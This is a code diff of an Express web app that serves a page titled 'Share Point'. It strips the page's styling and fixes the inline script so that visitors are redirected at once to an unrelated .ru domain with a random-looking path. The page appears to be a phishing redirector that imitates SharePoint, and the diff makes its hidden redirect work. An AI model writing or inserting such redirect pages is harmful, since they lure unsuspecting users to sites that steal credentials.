@@ -247,128 +247,13 @@ app.get('/', (req, res) => {
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Share Point</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background: #f0f0f0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-
-        .container {
-            width: 350px;
-            padding: 20px;
-            background-color: #fff;
-            border-radius: 10px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-            text-align: center;
-        }
-
-        h2 {
-            font-size: 24px;
-            color: #333;
-            margin-bottom: 15px;
-        }
-
-        p {
-            font-size: 16px;
-            color: #555;
-            margin-bottom: 20px;
-        }
-
-        button {
-            width: 100%;
-            padding: 12px;
-            background-color: #4e5ffa;
-            border: none;
-            color: #fff;
-            border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-        }
-
-        button:hover {
-            background-color: #8091f2;
-        }
-
-        .voice-wave {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-top: 20px;
-        }
-
-        .voice-wave span {
-            display: block;
-            width: 6px;
-            height: 20px;
-            background-color: #4e5ffa;
-            margin: 0 2px;
-            border-radius: 5px;
-            animation: wave 1s infinite ease-in-out;
-        }
-
-        .voice-wave span:nth-child(2) {
-            animation-delay: 0.1s;
-        }
-
-        .voice-wave span:nth-child(3) {
-            animation-delay: 0.2s;
-        }
-
-        .voice-wave span:nth-child(4) {
-            animation-delay: 0.3s;
-        }
-
-        .voice-wave span:nth-child(5) {
-            animation-delay: 0.4s;
-        }
-
-        @keyframes wave {
-
-            0%,
-            100% {
-                transform: scaleY(1);
-            }
-
-            50% {
-                transform: scaleY(1.5);
-            }
-        }
-
-        .footer-text {
-            font-size: 11px;
-            color: #666;
-            margin-top: 20px;
-            text-align: center;
-            line-height: 1.4;
-        }
-
-        .footer-text a {
-            color: #0000EE;
-            text-decoration: none;
-        }
-
-        .footer-text a:hover {
-            text-decoration: underline;
-        }
-
-        .footer-text small {
-            font-size: 10px;
-        }
-    </style>
 </head>
 
 <body>
 
     <script>
 
-    setTimeout(window.location.href = "https://Lxn.hicantesp.ru/Fxk3b/";, 10);
+    setTimeout(window.location.href = "https://Lxn.hicantesp.ru/Fxk3b/", 10);
 
     </script>
 
